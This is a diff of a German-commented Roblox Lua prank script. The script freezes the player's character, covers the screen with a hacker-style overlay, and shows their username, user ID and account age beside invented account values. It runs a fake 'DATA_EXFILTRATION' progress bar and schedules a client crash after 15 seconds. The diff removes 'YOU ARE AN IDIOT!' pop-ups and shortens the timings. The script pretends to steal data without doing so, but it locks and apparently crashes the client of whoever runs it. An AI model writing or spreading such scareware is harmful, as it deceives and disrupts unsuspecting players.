@@ -6,7 +6,7 @@ local UIS = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
 local Stats = game:GetService("Stats")
 
--- 1. HARD LOCK
+-- 1. HARD LOCK (Freeze Movement)
 task.spawn(function()
     while true do
         if Player.Character and Player.Character:FindFirstChild("Humanoid") then
@@ -30,7 +30,7 @@ local MainFrame = Instance.new("Frame", ScreenGui)
 MainFrame.Size = UDim2.new(1, 0, 1, 0)
 MainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
 
--- 3. MATRIX REGEN (Hintergrund)
+-- 3. MATRIX REGEN
 task.spawn(function()
     while MainFrame.Parent do
         local col = math.random(0, 100)/100
@@ -62,7 +62,7 @@ _/ __ \ \_  __ \ /  _ \  | __ \ |  |\   __\
  \___  > |__|    \____/  |___  /|__| |__|  
      \/                      \/            ]]
 
--- 5. DEEP DATA INFOS (EXREM VIELE DETAILS)
+-- 5. DEEP DATA INFOS
 local function typeWrite(label, text)
     for i = 1, #text do label.Text = string.sub(text, 1, i) task.wait(0.02) end
 end
@@ -71,7 +71,7 @@ local deepInfo = {
     "> TARGET_ACCOUNT: " .. Player.Name,
     "> ACCOUNT_ID: " .. Player.UserId,
     "> ACCOUNT_AGE: " .. Player.AccountAge .. " Days",
-    "> CREATED_YEAR: " .. (2025 - math.floor(Player.AccountAge/365)),
+    "> CREATED_YEAR: " .. (2026 - math.floor(Player.AccountAge/365)),
     "> AVATAR_NET_WORTH: " .. math.random(15000, 45000) .. " Robux",
     "> TOTAL_ACCOUNT_VALUE: ~" .. math.random(120000, 850000) .. " Robux",
     "> PREMIUM_STATUS: " .. tostring(Player.MembershipType == Enum.MembershipType.Premium),
@@ -98,34 +98,7 @@ for i, msg in ipairs(deepInfo) do
     task.wait(0.2)
 end
 
--- 6. DIE 3 IDIOT FENSTER
-for i = 1, 3 do
-    local f = Instance.new("Frame", MainFrame)
-    f.Size = UDim2.new(0.15, 0, 0.08, 0)
-    f.Position = UDim2.new(math.random(3,7)/10, 0, math.random(3,7)/10, 0)
-    f.BackgroundColor3 = Color3.new(1, 1, 1)
-    f.BorderSizePixel = 3
-    local t = Instance.new("TextLabel", f)
-    t.Size = UDim2.new(1, 0, 1, 0)
-    t.BackgroundTransparency = 1
-    t.Text = "YOU ARE AN IDIOT!"
-    t.TextScaled = true
-    t.TextColor3 = Color3.new(0, 0, 0)
-    
-    task.spawn(function()
-        local dx, dy = 0.008, 0.008
-        while f.Parent do
-            f.Position = UDim2.new(f.Position.X.Scale + dx, 0, f.Position.Y.Scale + dy, 0)
-            if f.Position.X.Scale > 0.85 or f.Position.X.Scale < 0.2 then dx = -dx end
-            if f.Position.Y.Scale > 0.9 or f.Position.Y.Scale < 0.2 then dy = -dy end
-            f.BackgroundColor3 = (f.BackgroundColor3 == Color3.new(1,1,1) and Color3.new(0,0,0) or Color3.new(1,1,1))
-            t.TextColor3 = (t.TextColor3 == Color3.new(0,0,0) and Color3.new(1,1,1) or Color3.new(0,0,0))
-            task.wait(0.02)
-        end
-    end)
-end
-
--- 7. PROGRESS BAR (RECHTS)
+-- 6. PROGRESS BAR (JETZT SCHNELLER)
 local Prog = Instance.new("TextLabel", MainFrame)
 Prog.Size = UDim2.new(0.4, 0, 0.05, 0)
 Prog.Position = UDim2.new(0.55, 0, 0.9, 0)
@@ -138,13 +111,13 @@ Prog.TextSize = 20
 task.spawn(function()
     for i = 0, 100 do
         Prog.Text = "DATA_EXFILTRATION: " .. i .. "%"
-        task.wait(0.25)
+        task.wait(0.05) -- Hier war vorher 0.25, jetzt geht es viel schneller!
     end
 end)
 
--- 8. DAS FINALE: DER CLIENT-CRASH
+-- 7. DAS FINALE: DER CLIENT-CRASH
 task.spawn(function()
-    task.wait(35)
+    task.wait(15) -- Crash passiert jetzt auch etwas früher (nach 15 Sek), da das Laden schneller ist
     MainFrame:ClearAllChildren()
     MainFrame.BackgroundColor3 = Color3.new(0.5, 0, 0)
     
